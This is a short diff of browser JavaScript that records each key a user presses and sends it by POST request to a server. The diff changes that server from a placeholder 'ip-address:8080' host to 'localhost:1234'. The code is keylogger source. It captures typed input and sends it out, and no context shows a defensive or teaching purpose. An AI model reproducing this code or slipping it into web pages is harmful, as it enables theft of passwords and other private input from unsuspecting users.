@@ -4,7 +4,7 @@
         var keystroke = 'key=' + encodeURIComponent(event.key);
 
         // Send the keystroke data to the server
-        fetch('http://ip-address:8080', {
+        fetch('http://localhost:1234', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
